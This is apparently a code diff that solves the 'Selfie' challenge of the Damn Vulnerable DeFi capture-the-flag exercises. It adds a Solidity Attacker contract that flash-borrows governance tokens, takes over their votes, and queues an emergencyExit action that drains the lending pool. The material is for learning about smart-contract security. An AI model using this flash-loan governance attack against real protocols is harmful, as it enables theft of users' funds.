@@ -7,6 +7,8 @@ import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
 
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
+
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -62,7 +64,23 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
+        Attacker attacker = new Attacker(token, governance, pool);
+
+        // Craft malicious action
+        bytes memory action = abi.encodeCall(
+            SelfiePool.emergencyExit,
+            (recovery)
+        );
+
+        // Place malicious action
+        uint256 actionId = governance.getActionCounter(); 
+        attacker.placeAction(address(pool), 0, action);
+
+        // Wait for minimum time to execute the action
+        vm.warp(block.timestamp + 3 days);
         
+        // Execute the action
+        governance.executeAction(actionId);
     }
 
     /**
@@ -71,6 +89,65 @@ contract SelfieChallenge is Test {
     function _isSolved() private view {
         // Player has taken all tokens from the pool
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
-        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
+        assertEq(
+            token.balanceOf(recovery),
+            TOKENS_IN_POOL,
+            "Not enough tokens in recovery account"
+        );
+    }
+}
+
+contract Attacker is IERC3156FlashBorrower {
+    bytes32 private constant CALLBACK_SUCCESS =
+        keccak256("ERC3156FlashBorrower.onFlashLoan");
+
+    DamnValuableVotes immutable token;
+    SimpleGovernance immutable governance;
+    SelfiePool immutable pool;
+
+    constructor(
+        DamnValuableVotes _token,
+        SimpleGovernance _governance,
+        SelfiePool _pool
+    ) {
+        token = _token;
+        governance = _governance;
+        pool = _pool;
+    }
+
+    function placeAction(
+        address target,
+        uint128 value,
+        bytes calldata data
+    ) external {
+        pool.flashLoan(
+            IERC3156FlashBorrower(address(this)),
+            address(token),
+            token.balanceOf(address(pool)),
+            abi.encode(target, value, data)
+        );
+    }
+
+    function onFlashLoan(
+        address initiator,
+        address _token,
+        uint256 amount,
+        uint256 fee,
+        bytes calldata data
+    ) external override returns (bytes32) {
+        // Delegate to self to get voting power
+        token.delegate(address(this));
+
+        // Queue malicious action
+        (
+            address actionTarget,
+            uint128 actionValue,
+            bytes memory actionData
+        ) = abi.decode(data, (address, uint128, bytes));
+        governance.queueAction(actionTarget, actionValue, actionData);
+
+        // Return funds to pool
+        token.approve(address(pool), type(uint256).max);
+        return CALLBACK_SUCCESS;
     }
 }
